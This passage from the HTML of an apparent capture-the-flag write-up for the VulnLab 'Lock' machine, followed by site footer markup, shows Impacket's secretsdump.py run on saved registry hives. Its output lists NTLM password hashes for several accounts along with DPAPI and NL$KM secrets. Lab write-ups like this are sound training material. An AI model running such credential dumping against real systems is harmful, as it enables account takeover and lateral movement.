class="line">??$ secretsdump.py -sam sam -system system -security security <span class="built_in">local</span></span><br><span class="line">Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xf35ee195e0f18f5322e7d278c32e5034</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bfaf6f7fe8c729c28917e5b6bb7952a2:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b1691c3f382a383ffc37d0314867f7ed:::</span><br><span class="line">ellen.freeman:1000:aad3b435b51404eeaad3b435b51404ee:8c7730fe7a2e319a91a3adb83aafdac8:::</span><br><span class="line">gale.dekarios:1001:aad3b435b51404eeaad3b435b51404ee:bd77abd07caa6b51254a7ae8d648a6e4:::</span><br><span class="line">mane:1002:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0x3fd066435261d6b63b63d0ef6e37d2d16bc2a09e</span><br><span class="line">dpapi_userkey:0x22af5e3ff1ce46e11a7812bf3b76309ed671ede8</span><br><span class="line">[*] NL<span class="variable">$KM</span></span><br><span class="line"> 0000   2F C5 58 AF 42 78 24 DE  82 E9 66 57 D0 0A 6E CE   /.X.Bx$...fW..n.</span><br><span class="line"> 0010   F4 1E A8 C2 A7 73 81 F1  06 8A 6C 4D 46 49 B1 EA   .....s....lMFI..</span><br><span class="line"> 0020   28 F4 A0 55 7E 2E FB 0C  3F 76 1A 24 EA 67 A3 CD   (..U~...?v.$.g..</span><br><span class="line"> 0030   C8 51 7C 6C 8C DF 2F BB  F4 C1 C9 FD 76 E8 33 FE   .Q|l../.....v.3.</span><br><span class="line">NL<span class="variable">$KM</span>:2fc558af427824de82e96657d00a6ecef41ea8c2a77381f1068a6c4d4649b1ea28f4a0557e2efb0c3f761a24ea67a3cdc8517c6c8cdf2fbbf4c1c9fd76e833fe</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&text=VulnLab - Machine - Lock"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&is_video=false&description=VulnLab - Machine - Lock"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Lock&body=Check out this article: https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&title=VulnLab - Machine - Lock"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&name=VulnLab - Machine - Lock&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/07-vulnlab-lock/&t=VulnLab - Machine - Lock"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
